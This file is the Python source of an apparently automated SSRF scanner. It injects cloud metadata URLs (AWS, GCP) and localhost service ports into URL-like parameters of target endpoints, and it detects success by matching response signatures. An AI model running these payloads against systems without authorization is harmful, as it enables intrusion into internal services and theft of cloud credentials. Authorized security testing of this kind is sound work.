import sys
import threading
import concurrent.futures
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from modules.logger_config import setup_logger
import pandas as pd

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Parameters that are likely to accept URLs/paths as input
URL_PARAMS = {
    "url", "uri", "path", "file", "fetch", "load", "src", "href",
    "image", "img", "redirect", "proxy", "request", "host", "dest",
    "data", "page", "feed", "template", "to", "open", "from",
    "callback", "domain", "server", "api", "endpoint", "resource",
    "link", "target", "source", "site", "input",
}

# (payload_url, response_signatures_that_confirm_access)
SSRF_TARGETS = [
    (
        "http://169.254.169.254/latest/meta-data/",
        ["ami-id", "instance-id", "local-ipv4", "placement"],
    ),
    (
        "http://169.254.169.254/",
        ["latest", "1.0", "2007"],
    ),
    (
        "http://metadata.google.internal/computeMetadata/v1/",
        ["project", "instance", "google"],
    ),
    (
        "http://127.0.0.1/",
        ["<html", "DOCTYPE", "Server:"],
    ),
    (
        "http://localhost/",
        ["<html", "DOCTYPE", "Server:"],
    ),
    (
        "http://0.0.0.0/",
        ["<html", "DOCTYPE"],
    ),
    (
        "http://127.0.0.1:22/",
        ["SSH-", "OpenSSH"],
    ),
    (
        "http://127.0.0.1:3306/",
        ["mysql", "MariaDB", "5."],
    ),
    (
        "http://127.0.0.1:6379/",
        ["-ERR", "+OK", "PONG"],
    ),
    (
        "http://127.0.0.1:5432/",
        ["PostgreSQL", "FATAL"],
    ),
]


class SSRFscanner:
    def __init__(
        self,
        base_url="",
        proxies=None,
        cookies=None,
        dataframe=None,
        threads=32,
        timeout=15,
    ):
        self.base_url = base_url
        self.proxies = proxies
        self.cookies = cookies
        self.threads = threads
        self.timeout = timeout
        self.dataframe = pd.read_csv(dataframe)
        self.vulnerable_endpoints = set()
        self.findings = {}
        self._lock = threading.Lock()
        self.logger = setup_logger(__name__)

    def _request(self, url, method="GET", data=None):
        try:
            kwargs = dict(
                proxies=self.proxies,
                cookies=self.cookies,
                verify=False,
                allow_redirects=True,
                timeout=self.timeout,
            )
            if method == "GET":
                return requests.get(url, **kwargs)
            return requests.post(url, data=data, **kwargs)
        except Exception:
            return None

    def _check_response(self, response, signatures):
        """Return True if any signature appears in the response body."""
        if response is None:
            return False
        body = response.text
        return any(sig.lower() in body.lower() for sig in signatures)

    def scan_url(self, url, method):
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        base = urlunparse(parsed._replace(query=""))

        suspicious = {k for k in params if k.lower() in URL_PARAMS}

        for param in suspicious:
            for target_url, signatures in SSRF_TARGETS:
                test_params = dict(params)
                test_params[param] = [target_url]
                test_url = f"{base}?{urlencode(test_params, doseq=True)}"
                resp = self._request(test_url, method)
                if self._check_response(resp, signatures):
                    self.logger.info(
                        f"[SSRF] {url} — param '{param}' fetched internal "
                        f"resource {target_url} (signatures found)\n"
                    )
                    with self._lock:
                        self.vulnerable_endpoints.add(url)
                        self.findings[url] = {
                            "param": param,
                            "payload": target_url,
                            "evidence": f"Signatures {signatures} found in response",
                            "confidence": 0.80,
                        }
                    return

    def gather_results(self):
        self.dataframe["SSRF"] = 0
        if not self.vulnerable_endpoints:
            self.logger.info("No SSRF vulnerabilities found\n")
        else:
            for url in self.vulnerable_endpoints:
                self.dataframe.loc[self.dataframe["URL"] == url, "SSRF"] = 1

        path = (
            f"{sys.path[0]}/results/{self.base_url}/DF/"
            f"{self.base_url}_ssrf.csv"
        )
        self.logger.info(f"Saving SSRF results to: {path}")
        self.dataframe.to_csv(path, index=False)

    def run(self, row):
        try:
            self.scan_url(row["URL"], row["Method"])
        except Exception as e:
            self.logger.error(f"Error scanning {row['URL']}: {e}")

    def start_scanning(self):
        self.logger.info("Launching SSRF scanner\n")
        try:
            with concurrent.futures.ThreadPoolExecutor(
                max_workers=self.threads
            ) as executor:
                executor.map(self.run, [row for _, row in self.dataframe.iterrows()])
            self.gather_results()
        except KeyboardInterrupt:
            self.logger.info("Keyboard interrupt — stopping\n")
            sys.exit(0)
        except Exception as e:
            self.logger.error(f"Error: {e}")
            raise
